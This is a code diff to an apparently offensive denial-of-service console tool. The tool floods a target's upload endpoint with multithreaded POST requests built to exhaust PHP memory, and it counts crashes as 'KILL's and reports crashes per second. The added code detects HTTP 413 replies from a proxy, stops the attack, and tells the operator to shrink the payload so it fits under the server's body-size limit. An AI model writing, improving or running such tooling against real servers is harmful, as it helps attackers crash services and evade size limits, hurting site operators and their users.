@@ -456,7 +456,10 @@ class Console:
         try:
             conn.request("POST", upload_path, body=producer_body, headers=headers)
             resp = conn.getresponse()
+            status = resp.status
             body = resp.read(2048)
+            if status == 413:
+                return "413"
             if b"Allowed memory size" not in body:
                 return "no_oom"
             conn.request("POST", upload_path, body=consumer_body, headers=headers)
@@ -488,17 +491,20 @@ class Console:
         failed = 0
         counter = 0
         stop = threading.Event()
+        got_413 = threading.Event()
         start = time.monotonic()
 
         def worker():
             nonlocal crashed, failed, counter
-            while not stop.is_set():
+            while not stop.is_set() and not got_413.is_set():
                 with lock:
                     if rounds and counter >= rounds:
                         return
                     counter += 1
                     my_i = counter
                 result = self._dos_round(upload_path, producer_body, consumer_body)
+                if result == "413":
+                    got_413.set()
                 with lock:
                     if result == "crashed":
                         crashed += 1
@@ -525,6 +531,9 @@ class Console:
               f" {counter} rounds in {elapsed:.1f}s\033[0m")
         if crashed and elapsed > 0:
             print(f"  \033[92m{crashed / elapsed:.2f} crashes/sec\033[0m")
+        if got_413.is_set():
+            print(f"\n  \033[91mProxy returned 413 — body too large for server limit.\033[0m")
+            print(f"  \033[93mReduce payload: set part-headers <n>  (current: {self.part_headers:,})\033[0m")
 
     def cmd_dos_start(self):
         import threading
@@ -545,12 +554,16 @@ class Console:
         start_time = time.monotonic()
         LOG_MAX = 14
 
+        got_413 = threading.Event()
+
         def attack_worker():
             nonlocal crashed, failed
-            while not stop.is_set():
+            while not stop.is_set() and not got_413.is_set():
                 result = self._dos_round(upload_path, producer_body, consumer_body)
                 if stop.is_set():
                     return
+                if result == "413":
+                    got_413.set()
                 ts = time.strftime("%H:%M:%S")
                 with lock:
                     if result == "crashed":
@@ -590,6 +603,8 @@ class Console:
             for ts, num, result in reversed(recent):
                 if result == "crashed":
                     tag = f"\033[92m{'KILL':>8s}\033[0m"
+                elif result == "413":
+                    tag = f"\033[91m{'413':>8s}\033[0m"
                 else:
                     tag = f"\033[91m{result:>8s}\033[0m"
                 out.append(f"  \033[2m{ts}\033[0m  #{num:<6d} {tag}")
@@ -613,6 +628,9 @@ class Console:
                 t.start()
             while any(t.is_alive() for t in pool):
                 draw()
+                if got_413.is_set():
+                    stop.set()
+                    break
                 time.sleep(0.5)
             draw()
         except KeyboardInterrupt:
@@ -636,6 +654,10 @@ class Console:
         print(f"  \033[1mDuration:\033[0m         {elapsed:.1f}s")
         if c and elapsed > 0:
             print(f"  \033[1mCrash rate:\033[0m       \033[92m{c / elapsed:.2f}/s\033[0m")
+        if got_413.is_set():
+            print(f"\n  \033[91mProxy returned 413 — body too large for server limit.\033[0m")
+            print(f"  \033[93mReduce payload: set part-headers <n>  (current: {self.part_headers:,})\033[0m")
+            print(f"  \033[93mTarget needs client_max_body_size >= {payload_size}\033[0m")
         print()
 
     def cmd_set(self, key=None, value=None, *_):
